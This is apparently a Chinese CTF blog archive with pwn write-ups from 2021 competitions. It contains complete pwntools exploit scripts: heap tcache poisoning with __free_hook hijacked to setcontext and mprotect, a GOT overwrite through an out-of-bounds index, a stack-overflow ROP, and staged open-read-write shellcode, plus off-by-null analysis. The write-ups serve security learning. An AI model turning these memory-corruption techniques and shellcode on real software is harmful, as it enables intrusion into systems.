<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#泄露libc基址</span><br>edit(<span class="hljs-number">5</span>, payload)<br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922165259157.png"><span class="image-caption">image-20210922165259157</span></p>
<p>往free_hook里面写入setcontext+53的地址</p>
<p>然后根据<code>setcontext+53</code>上的寄存器布置环境：而rdi的值是我们等下要释放的堆块的地址，根据这个计算出偏移，在对应的地址为rdi，rsi，rdx设置参数，然后设置rcx的值为mprotect的地址，去执行mprotect，再跳转回来执行shellcode读取flag</p>
<p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922170913920.png"><span class="image-caption">image-20210922170913920</span></p>
<p>成功读取flag！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;47.104.175.110&quot;,61608)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+ <span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap = leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr = leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+ <span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">5</span>, payload)<br><br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#shellcode</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>以后学到了，再回来复现（可能是近期 吧，近期决定爆肝学习，希望能）</p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021强网杯PWN</title>
    <url>/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>复现来源：</p>
<p><a href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png"><span class="image-caption">image-20210914154341329</span></p>
<p>checksec一下，64位，堆栈可执行</p>
<p>进入IDA，只存在申请和释放堆块的功能，其中，申请最多两次，释放只有一次。</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png"><span class="image-caption">image-20210914155156145</span></p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png"><span class="image-caption">image-20210914155132957</span></p>
<p>首先，没有检查索引下限，所以存在数组越界，可以越界到got表。然后输入函数中，如果我们在输入size时，直接输入’\n’，将会让size直接为0，而如果size为0了，在往堆里面输入数据是就可以无限输入，因为在检验那里，buf一旦获得跟ptr一样的地址，而buf又要先自加，才就会导致一直都将大于ptr，验证一直都是没有问题的</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png"><span class="image-caption">image-20210914155508246</span></p>
<p>程序有沙箱，所以就是orw。加上前面发现的漏洞点，结合起来就是，通过数组越界，将堆块指针写入到函数的got表里面，然后因为无限输入，堆块又可执行，所以往堆块里面写入shellcode，最后就是调用被修改函数，转而去执行shellcode来读取flag</p>
<p>然后呢，本地复现不了，暂时不知道该怎么让文件去链接上题目给的seccomp文件，所以只能讲讲思路</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <tags>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2021羊城杯PWN</title>
    <url>/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛，我能做的应该是有三题的，可能还是太菜了，比赛时就是没出，最终只做了个签到题，还好手快抢了一血，长路漫漫，继续加油吧！</p>
<p>复现来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120255533">https://blog.csdn.net/eeeeeight/article/details/120255533</a></p>
<h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>这题签到题，很简单的栈溢出，没什么好讲的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;192.168.39.50&#x27;</span>,<span class="hljs-number">11000</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;Input:\n&quot;)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x2c</span> + p32(<span class="hljs-number">0x80490a0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x0804c029</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913165518141.png"><span class="image-caption">image-20210913165518141</span></p>
<p>常规checksec，64位，保护基本没开，存在可执行段，这种一般就是注入shellcode去执行的</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170209042.png"><span class="image-caption">image-20210913170209042</span></p>
<p>同时，当你执行到admin功能时，会开启沙箱，禁用了execve，所以这题就变成了orw了。admin功能是必须要进的，因为这里才存在着漏洞——栈溢出</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170334228.png"><span class="image-caption">image-20210913170334228</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170528035.png"><span class="image-caption">image-20210913170528035</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170611997.png"><span class="image-caption">image-20210913170611997</span></p>
<p>buf这里可以写入30个字节的内容，所以可以覆盖到返回地址，但是具体的长度要动态去看。我这边是进入到了admin功能中，可以看见，前五个字节是用来对齐栈内容，接下来的八个字节就可以覆盖rbp内容，这边覆盖的是admin中输入函数的rbp</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913171057369.png"><span class="image-caption">image-20210913171057369</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221356910.png"><span class="image-caption">image-20210913221356910</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221754144.png"><span class="image-caption">image-20210913221754144</span></p>
<p>并且呢，.bss是属于可执行段的，先覆盖返回地址去执行read函数，因为read是有三个参数的，但是我们可以观察当执行read函数时，三个参数都是已经满足了的（因为我们刚开始就借着read函数的溢出，并且寄存器并未被改变）。所以写入数据的地方是栈上一个地址，所以先构造一次shellcode（注意shellcode大小，因为长度最多为0x1d）系统调用read函数，往.bss上写第二个shellcode，这次shellcode的长度一定要够大，不然写不下。最后就是在.bss上写最终的orw，读取flag即可</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913211252996.png"><span class="image-caption">image-20210913211252996</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>context.binary = elf<br>p = process(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>call_rsi = <span class="hljs-number">0x000000000040186b</span><br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000401007&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;password: &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x602030</span>+<span class="hljs-number">0x28</span>)+ p64(read) + p64(call_rsi)<br>p.sendline(payload)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              xor rax, rax;</span><br><span class="hljs-string">              push r11;</span><br><span class="hljs-string">              pop rdx;</span><br><span class="hljs-string">              mov rsi, 0x602100;</span><br><span class="hljs-string">              syscall;</span><br><span class="hljs-string">              add rsi, 28;</span><br><span class="hljs-string">              jmp rsi;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.sendline(shellcode)<br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rax, 2;</span><br><span class="hljs-string">               sub rsi, 16;</span><br><span class="hljs-string">               mov rdi, rsi;</span><br><span class="hljs-string">               xor rsi, rsi;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string"></span><br><span class="hljs-string">               mov rdi, rax;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rsi, 0x602300;</span><br><span class="hljs-string">               mov rdx, 0x80;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               </span><br><span class="hljs-string">               mov rax, 1;</span><br><span class="hljs-string">               mov rdi, 1;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode1))<br>p.sendline(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">11</span> + <span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>*<span class="hljs-number">3</span> + shellcode1)<br>p.interactive() <br></code></pre></td></tr></table></figure>

<h2 id="Whats-your-name"><a href="#Whats-your-name" class="headerlink" title="Whats your name"></a>Whats your name</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204918588.png"><span class="image-caption">image-20210923204918588</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083229104.png"><span class="image-caption">image-20210924083229104</span></p>
<p>add里面，会先申请一块0x10大小的堆块，然后在前八字节作为函数指针存放puts地址，后八字节存放一个大小在0~0x100之间的堆块地址，最多能申请出10个堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083439735.png"><span class="image-caption">image-20210924083439735</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083201516.png"><span class="image-caption">image-20210924083201516</span></p>
<p>在edit里面，写入函数会堆溢出一个0，漏洞点offbynull</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083514708.png"><span class="image-caption">image-20210924083514708</span></p>
<p>show里面，调用之前存放的函数指针，打印堆块内容</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083618714.png"><span class="image-caption">image-20210924083618714</span></p>
<p>释放堆块，全部置0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083715443.png"><span class="image-caption">image-20210924083715443</span></p>
<p>最后，程序开了沙箱，看来是要orw了</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204552633.png"><span class="image-caption">image-20210923204552633</span></p>
<p>这是什么都没做的情况，由于开启沙箱都是会这样的出现很多的堆块，里面有一块是unsorted chunk，给他申请回来，里面就已经存放着脏数据了，直接就能泄露libc。同样也能泄露出堆上地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924092730279.png"><span class="image-caption">image-20210924092730279</span></p>
<p>我们要利用offbynull，肯定是要制造出堆块重叠的，那么就一定要让堆块是连续的，所以不能是上面bin链存在的大小，并且offbynull，那溢出被覆盖为0的肯定是0xf0的堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093026970.png"><span class="image-caption">image-20210924093026970</span></p>
<p>这是连续申请出来的四个堆块，全都连在了一起，才方便我们后续制造堆块重叠</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093202818.png"><span class="image-caption">image-20210924093202818</span></p>
<p>通过offbynull，成功将in_use位置为0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924094657672.png"><span class="image-caption">image-20210924094657672</span></p>
<p>然后释放堆块，触发合并</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924195657525.png"><span class="image-caption">image-20210924195657525</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200058670.png"><span class="image-caption">image-20210924200058670</span></p>
<p>然后再把0xf0堆块申请回来，接着我们申请在bin有的堆块，因为再分配就是要重叠在之前未被释放的0x40的堆块上了，而我们要和这个堆块重叠的要选择那个程序帮我们申请的堆块，因为控制这个堆块是可以借着edit功能执行任意地址写的，或者在show功能里面获得执行权限，可谓好处多多</p>
